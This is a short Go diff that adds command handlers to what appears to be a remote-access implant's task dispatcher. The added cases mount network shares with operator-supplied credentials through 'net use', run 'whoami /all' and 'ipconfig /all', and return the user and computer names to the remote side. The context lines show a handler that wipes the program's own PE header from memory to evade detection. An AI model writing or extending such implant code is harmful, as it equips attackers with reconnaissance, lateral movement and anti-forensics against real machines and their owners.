@@ -1594,6 +1594,42 @@ func dispatchTask(t transport, task taskWire) {
 		}
 		t.sendResult(task.ID, out, errStr)
 
+	case "NET_USE":
+		var nu struct {
+			Share string `json:"share"`
+			User  string `json:"user"`
+			Pass  string `json:"pass"`
+		}
+		json.Unmarshal([]byte(task.Args), &nu)
+		out, _ := runShell(fmt.Sprintf(`net use "%s" "%s" /user:"%s" 2>&1`, nu.Share, nu.Pass, nu.User))
+		t.sendResult(task.ID, out, "")
+
+	case "NET_USE_DEL":
+		out, _ := runShell(fmt.Sprintf(`net use "%s" /delete /yes 2>&1`, strings.TrimSpace(task.Args)))
+		t.sendResult(task.ID, out, "")
+
+	case "WHOAMI":
+		out, _ := runShell("whoami /all")
+		t.sendResult(task.ID, out, "")
+
+	case "IPCONFIG":
+		out, _ := runShell("ipconfig /all")
+		t.sendResult(task.ID, out, "")
+
+	case "USERNAME", "USER":
+		v := os.Getenv("USERNAME")
+		if v == "" {
+			v = os.Getenv("USER")
+		}
+		t.sendResult(task.ID, v, "")
+
+	case "COMPUTERNAME":
+		v := os.Getenv("COMPUTERNAME")
+		if v == "" {
+			v, _ = os.Hostname()
+		}
+		t.sendResult(task.ID, v, "")
+
 	case "WIPE_MZ":
 		wipePEHeaders()
 		t.sendResult(task.ID, "[+] MZ header wiped", "")
